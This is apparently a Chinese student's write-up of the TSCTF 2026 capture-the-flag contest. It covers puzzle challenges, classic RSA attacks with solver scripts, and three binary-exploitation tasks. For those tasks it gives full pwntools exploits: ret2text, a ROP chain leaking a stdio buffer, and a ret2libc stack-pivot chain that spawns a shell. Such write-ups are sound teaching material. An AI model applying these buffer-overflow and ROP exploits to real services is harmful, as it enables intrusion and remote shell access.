---
title: TSCTF 2026 WriteUp
date: '2026-10-12 23:15:00'
description: TSCTF 2026 部分题题解
categories: [CTF]
tags: [CTF, WriteUp, TSCTF]
katex: true
top: true
cover: /images/tsctf2026/image-5.png
---
```flag
test{}
```

## Abstract 方向
### emoji
注意到第二句前三个字是 😙(亲) 🤛(拳) 🤛(石)

**flag:** 
```
TSCTF-J{明月松间照，清泉石上流}
```

### 有哪些优秀的麻将同人作品？
1. 问了 DeepSeek 让其回答每一排的牌型
2. 看到第一个是三色双龙会，然后想了想“三色双龙”开头的五言绝句都不记得，蒙了一个会当凌绝顶上去结果过了

**flag:** 
```
TSCTF-J{会当凌绝顶一览众山小}
```

## Crypto 方向
### The Thirteen Seals of RSA
呃啊！死去的初等数论突然开始攻击我！好在现在不用自己实现怎么求逆元了...

感谢趣味密码学的公选课让我好歹知道 c m e n 是啥意思()

解压缩 ```the_thirteen_seals_of_rsa.zip``` 得到 13 个 Python 脚本

![alt text](/images/tsctf2026/image.png)

阅读文件不难发现这是出题人用来**生成密文**的脚本，再结合题目名称可知这里有 13 个经典的 RSA 算法漏洞。逐个来看：

#### 01_small_message.py
```python
# 小明文攻击的必要条件：没有发生模 n 回绕。
assert m ** e < n
c = pow(m, e, n)
```

即 ```c = (m ** e) % n```，但是 ```m ** e < n```，那么 ```c = m ** e```

代入数据可得明文即为密文开 11 次方。

然鹅事情进行到这里由于我原先并没有去准备入门 Crypto 所以先去装了一些常用的 Python 库 边用边学了。

（并且接下来的内容会显得像是学习笔记...）

![alt text](/images/tsctf2026/image-1.png)

然后把拿到的 ```m``` 用 ```long_to_bytes``` 转回去即可。下同。

![alt text](/images/tsctf2026/image-2.png)

#### 02_low_exponent_k.py
由于 

```python
...
    if 1 <= k < 1000:
        break
...
print("k_bound = 1000")
```

可知 `k` (`m ** e` 除以 `n` 的商，在第一题中为 0) 被出题人限制在了 1000 以内。

又 `e = 3`, `m ** 3 = c + k · n`，那么把 k 从 1 枚举到 999 开 3 次方，看一下有没有能开成整数的：

```python
n = 141712967660494314613
c = 26757016392053533056
for k in range(1, 1000):
    r, exact = gmpy2.iroot(c + k*n, 3)
    if exact:
        m = int(r)
        print(m)
```
![alt text](/images/tsctf2026/image-3.png)

(推荐 VSCode 插件 Jupyter Notebook，在写 WP 时非常方便，可以把多段 py 脚本与结果集中展示)

#### 03_rabin.py

查询资料得知所谓 Rabin 就是 `e = 2` 的情况。题目很大方地给出了 `p` 与 `q`，于是直接分别对模 `p`、`q` 开平方。

这里有一个问题：取模意义下的开平方并不好算。

1：题目保证了 `p ≡ 3 (mod 4)`（对应生成脚本里的 `if p % 4 == 3: break`），这时有现成的开平方公式：`mp = c**((p+1)/4) mod p`。

2：**实数**开平方只有 2 个解（`±√c`），但**模 `n`**（`n = pq`）下会出现 4 个。原因是 `n` 是两个素数之积，根据中国剩余定理（CRT），求 `m² ≡ c mod n` 等价于同时求：

```
m² ≡ c  (mod p)   →  两个解：±mp
m² ≡ c  (mod q)   →  两个解：±mq
```

组合一下就会有四种：

```
CRT( +mp, +mq )
CRT( +mp, −mq )
CRT( −mp, +mq )
CRT( −mp, −mq )
```

这 4 个根成对互为**相反数**：若 `m` 是根，则 `n − m` 也是根。

这也是 Rabin 的精髓所在：得出四个结果后还需要额外的信息才能得出最终结果。不过我们既然已经知道明文是一个 3 字符的串就没有什么难度了。

综上可得：

```python
from sympy.ntheory.modular import crt
from Crypto.Util.number import long_to_bytes as l2b
p = 78618122415698687727251078451109145440294587931348076166411625157290336194323
q = 70068194590650872266570572115266810127933946443699670783141720130585522796679
c = 23826347738176
n = p * q
mp = pow(c, (p + 1) // 4, p)
mq = pow(c, (q + 1) // 4, q)
for a in (mp, p - mp):
    for b in (mq, q - mq):
        x = int(crt([p, q], [a, b])[0])
        print(l2b(x))
```
![alt text](/images/tsctf2026/image-4.png)

肉眼可知 ```'J{H'``` 即为所求。

#### 04_wiener.py

这个我不会。在比赛时就是询问的 AI 大人 OTZ OTZ OTZ

所以如果注重本文的“题解”性质的话我完全没办法简短地讲清楚啊。在此抛出链接：


[CTF Wiki 上的 Wiener 介绍](https://ctf-wiki.org/crypto/asymmetric/rsa/d_attacks/rsa_extending_wiener/) (只要读原理那一部分就够做这题了)

[OI Wiki 上的连分数介绍](https://oi-wiki.org/math/number-theory/continued-fraction/)

大概意思就是：当私钥 `d` 太小时，由 `ed ≡ 1 (mod φ(n))` 可得 `k/d ≈ e/φ(n)`，也就是 **`k/d` 是 `e/n` 的一个很好的有理逼近**；把 `e/n` 做连分数展开、枚举渐近分数就能恢复出 `k/d`，进而算出 `d`，再分解 `n`。

```python
from Crypto.Util.number import long_to_bytes as l2b
from gmpy2 import isqrt
n = 7297717526980528803416151454296405543230501769792380224675788523837314043127326139076479288035857949142724168362589486899807096653717101268027396129754087
e = 983811702816974382973246581428198957793880120537552344799328942701778206113546592340385294586917077106490499330586393966740719479436824552594359051268947
c = 1403121770503832384963635118647377948005021775505670157212968759139769785924044936766749890516337665028344892741458301995617829694653904346225542682489494

def continued_fraction(num, den):
    while den:
        a = num // den
        yield a
        num, den = den, num - a * den

def wiener_attack(e, n):
    p_nm2, p_nm1 = 0, 1
    q_nm2, q_nm1 = 1, 0
    for a in continued_fraction(e, n):
        k = a * p_nm1 + p_nm2
        d = a * q_nm1 + q_nm2
        p_nm2, p_nm1 = p_nm1, k
        q_nm2, q_nm1 = q_nm1, d
        if k == 0 or (e * d - 1) % k:
            continue
        phi = (e * d - 1) // k
        s = n - phi + 1
        disc = s * s - 4 * n
        if disc < 0:
            continue
        t = isqrt(disc)
        if t * t == disc and (s + t) % 2 == 0:
            return int(d)

d = wiener_attack(e, n)
print(l2b(pow(c, d, n)))

# 有一种熟悉的感觉...
```

至此也可知：破解 RSA 有两条路：
1. 绕过 d (01 to 03)
2. 搞出 d (04 ...)

#### 05_hastad_broadcast.py

```python
e = 3
# 把 m 用 3 组不同的 n 加密，得到 c_1, c_2, c_3
```

这就是“广播(broadcast)”。现在我们可以用中国剩余定理把三组同余式合一：

```
X ≡ c_1 (mod n_1)
X ≡ c_2 (mod n_2)
X ≡ c_3 (mod n_3)
```

因为 `m**3 < n_1·n_2·n_3`，合成结果 `X = m**3`（没回绕），直接开三次方：

```python
X = int(crt(ns, cs)[0])         # sympy.ntheory.modular.crt，参数为 (模数表, 余数表)
r, exact = gmpy2.iroot(X, 3)
m = int(r)
```

![alt text](/images/tsctf2026/image-5.png)

#### 后面
后面的都好难。我大概看了看思路吧...写不了 WP...杀了我罢...

| 关卡 | 攻击名称 | CTF Wiki 链接 |
|------|----------|---------------|
| 06 | Pollard p−1（p−1 光滑） | [模数相关攻击 > p−1 光滑](https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/#p-1) |
| 07 | Williams p+1（p+1 光滑） | [模数相关攻击 > p+1 光滑](https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/#p-1_1) |
| 08 | 共模攻击 | [模数相关攻击 › 共模攻击](https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/#_7) |
| 12 | 已知 e、d → 分解 n | [私钥 d 相关攻击 > d 泄露攻击](https://ctf-wiki.org/crypto/asymmetric/rsa/d_attacks/rsa_d_attack/#_1) |

#### 拼起来

```
TSCTF-J{Happy_RSA????
```

## PWN 方向
Pwn 方向！
### signin

先 `checksec signin`

![alt text](/images/tsctf2026/image-6.png)

`No PIE + No Canary + NX` 初见端倪。然后用 IDA 打开：

![alt text](/images/tsctf2026/image-7.png)
![alt text](/images/tsctf2026/image-8.png)

`main` 中有 `read()`，`win` 是后门函数，无疑是 `ret2text` 了。

写 exp:
```py
from pwn import *
context(os="linux", arch="amd64", log_level="info")
io = process("./signin")
# io = remote(...)
elf = ELF("./signin")

buf = 0x40                  # 先填满 name
saved_rbp = 0x8             # 越过 saved rbp
win = elf.symbols['win']    # 直接查 win 的地址
ret = ROP(elf).find_gadget(['ret'])[0] # 神秘的对齐用垫片

payload = b'A' * buf + b'B' * saved_rbp + p64(ret) + p64(win)

io.sendlineafter(b'name: \n', payload)
io.interactive()
```

换成 remote 后执行：

![alt text](/images/tsctf2026/image-9.png)

问了 AI 得知原来不是所有环境都会有 ls...感觉自己撒撒的...

那么可以用 `echo *` 来代替。不过先直接 `cat /flag`：

![alt text](/images/tsctf2026/image-10.png)

**flag:** 
```
flag{WH4T_woULD-y0u_Ilk3-fOr-DiNn3r874c87}
```

话说为啥这个不是 TSCTF 的前缀呢()

### flag-memory

依旧上来先 `file + checksec` 一下：
![alt text](/images/tsctf2026/image-11.png)

再 IDA 反编译看一看：

![alt text](/images/tsctf2026/image-12.png)

在 `main` 中立刻注意到 `fgets` 与 `read`，符号表中也有 `true_end`。

再执行一下，`printf("[Memory] Original location: %p\n", save_data)` 把 `save_data` 的堆地址打印出来了：

![alt text](/images/tsctf2026/image-13.png)

这就让我们得到了关键的思路：

程序在从 `/flag` 中读入 `save_data` 后，立刻用 `memset` 擦掉了；但是由于 `fgets` 是带缓冲的——glibc 的 stdio 会先把 `/flag` 的内容读进 `FILE` 结构里那个由 `malloc` 分配在堆上的输入缓冲区（`_IO_buf_base`）——所以即便 `save_data` 被擦掉，这份缓冲副本仍在堆上。于是我们可以借助泄露出的 `save_data` 地址推出缓冲区的地址，然后再通过构造 `ROP` 链的方式给 `rdi` 赋值、调用 `true_end` 以得到 `flag`。

开始操作。

1. 由于程序会检查 flag_stream 是否存在，否则会自刎归天，本地测试时需要先创建 /flag 文件。例如创建这样的：
![alt text](/images/tsctf2026/image-15.png)

2. 比较难的一步就是怎么从泄露的地址得到缓冲区的地址。其实我没有怎么细想，问了一下 AI `fgets` 相关的知识感觉也许可能这个 `offset` 是固定的？先试一下吧。

在 IDA 里找一下 `memset` 的地址用来打断点：

![alt text](/images/tsctf2026/image-16.png)

用 `gdb` 测试（截图感觉比较乱，整理成代码段了）：

```gdb
gdb ./flag_memory
pwndbg> b *0x4012ac // 打断点
Breakpoint 1 at 0x4012ac: file chall.c, line 38.
pwndbg> run
...
pwndbg> p *flag_stream // flag_stream 在源码里声明为 FILE *，这个信息存在 DWARF 里；FILE 是一个结构体类型，用 * 解引用就可以得到 flag_stream 里存的东西，这里面就包括我们在找的 _IO_buf_base = 0x405510

$3 = {
  _flags = 0xfbad2488,
  _IO_read_ptr = 0x405529 "",
  _IO_read_end = 0x405529 "",
  _IO_read_base = 0x405510 "suki{Sakayori_Iroha_168}\n",
  _IO_write_base = 0x405510 "suki{Sakayori_Iroha_168}\n",
  _IO_write_ptr = 0x405510 "suki{Sakayori_Iroha_168}\n",
  _IO_write_end = 0x405510 "suki{Sakayori_Iroha_168}\n",
  _IO_buf_base = 0x405510 "suki{Sakayori_Iroha_168}\n",
  _IO_buf_end = 0x406510 "",
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x7ffff7e054e0 <_IO_2_1_stderr_>,
  _fileno = 0x3,
  _flags2 = 0x0,
  _old_offset = 0x0,
  _cur_column = 0x0,
  _vtable_offset = 0x0,
  _shortbuf = "",
  _lock = 0x405410,
  _offset = 0xffffffffffffffff,
  _codecvt = 0x0,
  _wide_data = 0x405420,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0x0,
  _mode = 0xffffffff,
  _unused2 = '\000' <repeats 19 times>
}

// 再计算 offset
pwndbg> p (long)flag_stream->_IO_buf_base - (long)save_data
$5 = 0x270
```

3. 然后就可以尝试构造 `ROP` 了。注意 64 位下 `true_end` 是需要用 `rdi` 传参的；所幸出题人好心地给了 `memory_key` 作为 `pop_rdi` 的 `gadget`。

```python
from pwn import *
context(os="linux", arch="amd64", log_level="info")
io = process("./flag-memory")
io = remote(...)
elf = ELF("./flag_memory")

buf = 0x30
saved_rbp = 0x8
pop_rdi = elf.symbols['memory_key']
offset = 0x270
true_end = elf.symbols['true_end']
# ret = ROP(elf).find_gadget(['ret'])[0]

io.recvuntil("Original location: ")
leak = int(io.recvline().strip(), 16) # 拿到泄露的堆地址

payload = b'A' * buf + b'B' * saved_rbp + p64(pop_rdi) + p64(leak + offset) + p64(true_end)

io.send(payload)
io.interactive()
```

本地测试通过后就可以连上 `remote` 了。

![alt text](/images/tsctf2026/image-17.png)

其实后来知道 `ELF()` 可以用 `checksec = False` 参数，就不会再输出一遍 `checksec` 信息了。

**flag:** 
```
TSCTF{stdi0_remembers_what_y0u_f0rg0t}
```

### ret2libc

诶这道题会不会用到 `ret2libc` 呢，好难猜啊（）

先 `file + checksec`：

![alt text](/images/tsctf2026/image-18.png)

`No PIE + No Canary + NX + Partial RELRO`，非常标准的堆栈溢出。

用 IDA 打开，`main` / `filter` / `vuln` 三个函数看下来：

`main` 的逻辑大概是：

```c
setbuf(stdout, NULL);
puts("~ murasame's guestbook ~\n~ rumor has it: the back of murasame's draft hides a more elegant path ~");
puts("[*] sanitizer: blocking byte 0x65");
puts("who are you?");
long n = read(0, name, 0x1f);
if (n <= 0) return 0;
filter(name, n);                     // 第二个参数是 read 的返回值
while (1) {
    gate_ticket = 0x5a5a5a5a5a5a5a5a;   // 每次进循环都重新设好
    vuln();
}
```
（我说 AI 是很强很强的反编译器有没有懂的）

`filter`：

```c
void filter(char *s, long n) {
    for (long i = 0; i < n; i++)
        if (s[i] == 0x65) {                    // 0x65 = 'e'
            puts("[!] badchar detected");
            _exit(1);
        }
}
```

`vuln`：

```c
void vuln(void) {
    char buf[0x50];
    if (first != 0) {                          // 在 IDA 双击可以查到 first 的初值是 1
        if (strcmp(name, "murasame") != 0) {
            puts("[!] identity mismatch, who are you??");
            _exit(1);
        }
    }
    first = 0;
    puts("say something> ");
    long n = read(0, buf, 0x200);              // 0x50 的缓冲区读 0x200 -> 栈溢出
    if (n <= 0) _exit(0);
    filter(buf, n);
    if (gate_ticket != 0x5a5a5a5a5a5a5a5a) {   // main 每次调用前都设好了，正常能过
        puts("[!] broken workflow");
        _exit(1);
    }
    gate_ticket = 0;
    return;
}
```

我一进来就发现三个问题：

1. `filter` 把 `0x65`（`'e'`）当做 badchar，所以第一条 payload 里不能出现任何 `0x65`。
2. 想安全通过 `vuln` 里的 `strcmp` 就得让 `name == "murasame"`，可这个单词的最后一位恰恰是 `e`（`0x65`），发进去直接就被 `filter` 打死了。
3. 如果泄露出了 libc 的地址，也是随机的，可能会让 `payload` 爆炸。

不过第 2 条有个缺口：`if (first != 0)` 里 `first` 初值为 `1`，所以第一次进 `vuln` 根本不检查名字，随便发什么都行。第二次就不行了。那么可以想见肯定要有第二次了...

当然我们不能忘记题目给的妙妙小提示：

![alt text](/images/tsctf2026/image-19.png)

> "the **back of** murasame's **draft** hides a more elegant path"

总之我们来 IDA 里看一下 `Names` 栏：

![alt text](/images/tsctf2026/image-20.png)

![alt text](/images/tsctf2026/image-21.png)

`draft` 是个 16KB 的全局数组，没有任何一行代码引用过它，可以拿来爽用。赞美出题人。而 "back of" 是字面意思：栈是向下生长的，把伪栈放在 `draft` 的后半截，下面才有足够的可写空间给 `system` 用栈；要是放在开头，rsp 一往下走就会进 `.bss` 下���那片只读页，就段错误了。

于是我们的思路就是：**两阶段 + 栈迁移**

- 第一条链（写在栈上，必须不含 `0x65`）：`puts(puts@got)` 泄漏 libc，然后用 `read(0, fake_stack, 0x200)` 把第二条链读进 `draft`，最后 `leave; ret` 把 rsp 迁过去；
- 第二条链（写在 `draft` 内部的 `fake_stack` 上，也就是 `0x407ec0`）：`system("/bin/sh")`。

因为我一开始一直搞不清楚，在此附上 AI 画的栈上布局：

栈上布局（`buf` 到 `saved rbp` 是 `0x50`）：

```
0x00 ~ 0x4f   padding           
0x50          fake_stack        <- 覆盖 saved rbp，给最后的 leave;ret 用
0x58          pop rdi; ret      ┐
0x60          puts@got          │ puts(puts@got)
0x68          puts@plt          ┘
0x70          pop rdi; ret      ┐
0x78          0                 │
0x80          pop rsi; ret      │ read(0, fake_stack, 0x200)
0x88          fake_stack        │
0x90          pop rdx; ret      │
0x98          0x200             │
0xa0          read@plt          ┘
0xa8          leave; ret        <- 迁移
```

exp：

```python
from pwn import *

context(os="linux", arch="amd64", log_level="info")

BIN, LIBC = "./pwn", "./libc.so.6"

# 本地用题目自带的 ld + libc
io = process(["./ld-linux-x86-64.so.2", "--library-path", ".", BIN])
# io = remote(...)

elf = ELF(BIN)
libc = ELF(LIBC)
rop = ROP(elf)

# 出题人藏在 legacy_abi_shimX 里的 gadget
# （+4 是为了跳过函数最开头的 endbr64，直接落在 pop 那条指令上）
pop_rdi = elf.sym["legacy_abi_shim"] + 4      # pop rdi; ret
pop_rsi = elf.sym["legacy_abi_shim2"] + 4     # pop rsi; ret
pop_rdx = elf.sym["legacy_abi_shim3"] + 4     # pop rdx; ret

# leave_ret / ret，也可以直接填 vuln() 里查到的
leave_ret = rop.find_gadget(["leave", "ret"])[0]   # 栈迁移用
ret = rop.find_gadget(["ret"])[0]                  # system 前垫一个，做 16 字节对齐

# _end 就是 draft 的末尾 0x4080c0
fake_stack = elf.sym["_end"] - 0x200
# 也等价于 elf.sym["draft"] + 0x4000 - 0x200

io.recvuntil(b"who are you?")
io.send(b"wooyun")

payload = b"A" * 0x50         # 填满 vuln 的 buf[0x50]
payload += p64(fake_stack)    # 覆盖 saved rbp 留给最后的 leave;ret 用

# puts(puts@got)，不要把 got 和 plt 弄反
payload += p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"])

# read(0, fake_stack, 0x200)：把第二条链读进 draft
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(fake_stack)
payload += p64(pop_rdx) + p64(0x200) + p64(elf.plt["read"])

# leave;ret：rsp = rbp = fake_stack，来到 draft
payload += p64(leave_ret)

# 以防万一
assert b"\x65" not in payload

io.recvuntil(b"say something> ")
io.send(payload)
io.recvline()             # 吃掉 "say something> " 后面那个换行

# 收泄漏 → 算 libc base
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]

# 下面的内容会被上面那条 read(0, fake_stack, 0x200) 写进 draft，
payload = p64(52168)      # IROHA SUKI~~~
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(ret)       # 依旧施展魔法
payload += p64(libc.symbols["system"])
io.send(payload)

io.interactive()
```

终于要写完了！懒得本地了直接来吧

![alt text](/images/tsctf2026/image-22.png)

**flag:** 
```
TSCTF{who_ar3_you_i_am_murasam3}
```

撒花🎉！
